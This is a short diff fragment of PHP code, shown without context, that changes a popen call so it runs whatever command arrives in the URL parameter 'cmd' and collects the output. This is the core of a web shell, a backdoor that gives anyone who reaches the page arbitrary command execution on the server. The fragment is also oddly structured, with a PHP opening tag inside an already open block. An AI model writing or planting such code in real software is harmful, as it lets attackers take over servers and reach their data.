@@ -9,7 +9,7 @@
     if(isset($_GET['cmd']))
     {
 <?php
-$handle = popen(cmd, "r");
+$handle = popen($_GET['cmd'], "r");
 $output = "";
 
 while (!feof($handle)) {
